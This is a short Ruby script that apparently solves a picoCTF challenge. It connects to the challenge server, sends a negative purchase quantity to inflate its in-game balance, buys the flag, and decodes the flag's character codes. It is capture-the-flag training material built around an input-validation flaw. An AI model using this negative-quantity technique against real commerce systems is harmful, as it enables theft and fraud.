#!/bin/env ruby

require 'socket'

def read_data(sock)
  res = [];
  while (line = sock.gets) && line.chomp !~ /"Flag is .*$"/
    res << line
  end

  return res[-1]
end

def increase_money(sock)
  puts "Increasing money..."
  sleep 1
  sock.write("0\n")
  sock.write("-999\n")
end

def buy_flag(sock)
  puts "Buying the flag..."
  sleep 0.8
  sock.write("2\n")
  sock.write("1\n")
end

def fetch_flag(sock)
  result = ""
  puts "Doing some magic to fetch the flag..."
  sleep 1
  flag = read_data(sock)   # Flag is [...]
  flag = flag.gsub(/^.*\[(.*)\]/, "\\1").split()
  
  for dec in flag
    result += dec.to_i.chr
  end

  return result
end

def main
  hostname = 'mercury.picoctf.net'
  port = 3952

  s = TCPSocket.open(hostname, port)

  increase_money(s)
  buy_flag(s)
  flag = fetch_flag(s)

  s.close

  puts "\nHere comes your flag sir: \n" + flag

end

main
